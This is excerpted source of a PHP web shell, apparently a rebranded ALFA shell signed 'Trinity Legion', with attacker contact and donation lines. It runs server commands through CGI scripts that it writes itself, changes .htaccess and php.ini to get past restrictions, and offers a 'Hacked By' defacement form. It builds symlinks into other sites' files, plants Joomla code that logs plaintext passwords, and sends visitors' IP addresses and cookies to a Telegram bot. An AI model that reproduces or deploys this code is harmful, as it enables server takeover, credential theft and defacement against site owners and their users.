...
define("__TRINITYLEGION_DATA_FOLDER__", "TRINITYLEGION_DATA");
...
<title>~ TRINITY LEGION Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="TRINITY LEGION 2025" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ TRINITY LEGION Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["trinitylegioncgiapi"])){
			if(!@file_exists("trinitylegioncgiapi/".$_COOKIE["trinitylegioncgiapi"].".trinitylegion")){
				$recreate = true;
				$lang = $_COOKIE["trinitylegioncgiapi"];
			}
		}
		if(!isset($_COOKIE["trinitylegioncgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".trinitylegion",$source);
			}
			alfacgihtaccess('cgi', "trinitylegioncgiapi/");
		}else{
			$lang = $_COOKIE["trinitylegioncgiapi"];
		}
		$cgi_ext = ".trinitylegion";
		if($lang=="aspx"){
			$cgi_ext = ".aspx";
		}
		$cgi_url = __TRINITYLEGION_DATA_FOLDER__."/trinitylegioncgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("trinitylegioncgiapi", $lang);
			}
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ TRINITY LEGION Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
<style type="text/css">';?>
...
$cookie_data = !empty($_COOKIE) ? json_encode($_COOKIE, JSON_PRETTY_PRINT) : 'Tidak Ada';
$timestamp   = date('Y-m-d H:i:s');

// Bangun pesan
$message  = "🚨 *File Access Detected!*\n\n";
$message .= "🕒 *Waktu Akses:* $timestamp\n";
$message .= "🔗 *URL:* $file_url\n";
$message .= "🌍 *IP Address:* $ip_address\n";
$message .= "🧭 *User-Agent:* $user_agent\n";
$message .= "📨 *Method:* $request_method\n";
...
function sendMessageToTelegram($token, $chat_id, $message) {
    ...
    $data = array(
        'chat_id' => $chat_id,
        'text'    => $message,
        'parse_mode' => 'Markdown' // agar teks bold & emoji rapi
    );
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="200" height="170" alt="TRINITY LEGION 2025" draggable="false" src="https://res.cloudinary.com/dhpzo07xs/image/upload/v1748787351/ltl_nvnckj.png" /></td>
</tr>
<tr>
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('TRINITY LEGION is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>TRINITY LEGION Uploader</option><option value='my'>My Private Shell</option></select>";
...
<font color='#00A220'>Shell Coded By Trinity Legion (TRINITY LEGION)</font><br>
<font color='#00A220'>Contact : trinitylegion@yahoo.com</font><br>
<font color='#00A220'>Telegram Channel: @trinitylegion</font><br>
<font color='#FF0000'>Hidup Sederhana Sambil Seruput Kopi Saat Hujan</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["sukabintang01cgiapi_mode"])&&!isset($_COOKIE["trinitylegioncgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	$temp = "";
	$not_api = array("basedir.trinitylegion", "getdir.trinitylegion", "getheader.trinitylegion");
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __TRINITYLEGION_DATA_FOLDER__);
	}
	@mkdir('trinitylegioncgiapi',0755);
	__write_file("trinitylegioncgiapi/".$name, __get_resource($source));
	@chmod("trinitylegioncgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$tmp_path = alfaWriteTocgiapi("getheader.trinitylegion",$bash);
		$data = alfaEx("cd '{$tmp_path}/trinitylegioncgiapi';sh getheader.trinitylegion",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./TrinityLegion &copy; 2025-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1E47z61hurQyBuCTJeYyDZqTXUCmkytpGD\");' style='color: #E91E63;text-decoration: none;'>Donate Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>trinitylegion[at]yahoo.com</span><span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/trinitylegionbot'>@trinitylegionbot</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/trinitylegioncgiapi/getdir.trinitylegion")){
			...
			$tmp_getdir_path = alfaWriteTocgiapi("getdir.trinitylegion",$bash);
			__alfa_set_cookie("alfachdir_bash", "true");
			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
		}
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/trinitylegioncgiapi;sh getdir.trinitylegion '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By Trinity Legion</title><b>Hacked By Trinity Legion</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Hacked By Trinity Legion</title><b>Hacked By Trinity Legion</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Trinity Legion(TRINITY LEGION)");
...
<input type="text" name="defacer" size="67" id="text" placeholder="TRINITY LEGION 2025" />
<br>
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __TRINITYLEGION_DATA_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__TRINITYLEGION_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__TRINITYLEGION_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__TRINITYLEGION_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__TRINITYLEGION_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
if($m=='cgi'){
$code = "#Coded By Trinity Legion\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .trinitylegion\nAddHandler cgi-script .trinitylegion";
}elseif($m=='sym'){
...
$tmp_path = alfaWriteTocgiapi("basedir.trinitylegion",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/trinitylegioncgiapi;sh basedir.trinitylegion ".$makepwd,false,true,true);
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$TRINITYLEGION_DATA = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($TRINITYLEGION_DATA, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
return('<iframe src="'.__TRINITYLEGION_DATA_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
...
exit;
/*
#Trinity Remains Watched
#skype : Trinity Legion Exploits
*/
?>
